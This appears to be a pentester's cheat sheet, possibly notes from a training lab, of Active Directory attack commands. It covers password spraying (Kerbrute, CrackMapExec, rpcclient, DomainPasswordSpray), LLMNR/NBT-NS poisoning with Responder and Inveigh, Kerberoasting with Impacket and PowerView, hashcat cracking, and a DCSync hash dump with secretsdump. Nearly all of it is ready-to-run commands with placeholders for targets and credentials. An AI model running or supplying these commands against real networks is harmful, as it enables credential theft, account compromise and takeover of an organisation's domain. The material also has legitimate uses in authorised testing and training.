# Password spray
### Kerbrute password spray
``` bash
kerbrute passwordspray -d <DOMAIN> --dc <IP> valid_users.txt  <PASSWD>
```
### CrackMapExec - Passwd Spray
``` bash
sudo crackmapexec smb <IP> -u valid_users.txt -p <PASSWD> | grep +
#After getting hits with opur attack, validate creds againts DC
sudo crackmapexec smb <IP> -u <USERNAME> -p <PASSWD>
```
### Internal password Spray - Linux
``` bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%<PASSWD>" -c "getusername;quit" <IP> | grep Authority; done
```
### Internall Password Spray - Win
``` powershell
#https://github.com/dafthack/DomainPasswordSpray
#Download with powershell: Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1" -OutFile "DomainPasswordSpray.ps1"
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
# LLMNR/NBT-NS Poisoning
Man-in-the-middle that captures usernames and password hashes in network
### LLMNR/NBT-NS Poisoning - Linux
```bash
#Kali
#generates report to /usr/share/responder/logs
sudo responder -I <IP> -A
#cannot be used with pass-the-hash so need to crack hashes offline
#crack hashes with hashcat in 5600 mode
hashcat -m 5600 <hash> /usr/share/wordlists/rockyou.txt
#IF HASHCAT FAILS RUN FOLLOWING CMD TO CLEAN THE HASH:
#cat hash.txt | tr -d '\n\r\t ' > cleaned_hash.txt
```
### LLMNR/NBT-NS Poisoning - Windows
``` powershell
#using inveigh.exe https://github.com/Kevin-Robertson/Inveigh
.\inveigh.exe
#after succesfull capture show options:
#HELP
#Get NTLM2Unique usernames and hashes:
GET NTLMV2UNIQUE
```
# Kerberoasting
Get SPN tickets and crack offline
### Kerberoasting with GetUserSPNs.py (From Attack machine)
``` bash
#Requires username and password of domain user
#List SPN Accounts with GetUserSPNs.py
impacket-GetUserSPNs.py -dc-ip <IP> <DOMAIN>/<USERNAME>
#Get all TGS Tickets
impacket-GetUserSPNs.py -dc-ip <IP> <DOMAIN>/<USERNAME> -request
#Get single accounts TGS ticket and write to file for offline cracking
impacket-GetUserSPNs.py -dc-ip <IP> <DOMAIN>/<USERNAME> -request-user <ACCOUNT_NAME> 
-outputfile <OUTPUT_FILE>
#Crack with hashcat mode 13100
hashcat -m 13100 <HASH_FILE> /usr/share/wordlists/rockyou.txt 
#after succesfull crack, test authentication against DC
sudo crackmapexec smb <DC-IP> -u <USERNAME> -p <PASSWD>
```
### Kerberoasting with powerview (TARGET MACHINE) 
``` powershell
#https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/README.md
#Import module
Import-Module .\PowerView.ps1
#Get accounts and SPNs
Get-DomainUser * -spn | select samaccountname, serviceprincipalname
#Get hashes from specific account
Get-DomainUser -Identity <ACCOUNT> | Get-DomainSPNTicket -Format Hashcat
#(optional) or just get all the hashes from all accounts and export to CSV file
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
#if needed fix hash format:
#cat hash.txt | tr -d '\n' | tr -d ' ' > fixed-hash.txt or jusr get the csv which is in correct format
#Crack with hashcat mode 13100
hashcat -m 13100 <HASH_FILE> /usr/share/wordlists/rockyou.txt 
#after succesfull crack, test authentication against DC
sudo crackmapexec smb <DC-IP> -u <USERNAME> -p <PASSWD>
#the we can use PSCredential Object for movement (Check Lateral Movement tab)
```
# DCSync
Steal AD password Db by using the built-in `Directory Replication Service Remote Protocol`. Requires user with DCSync Privileges
``` bash
#Kali
#Extract NTLM Hashes and Kerberos Keys Using secrets
impacket-secretsdump -outputfile inlanefreight_hashes -just-dc <DOMAIN>/<USERNAME>@<IP> 
# You can Check user that has this option enabled. DCSync will provide these creds in cleartext (optional?) Powershell:
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
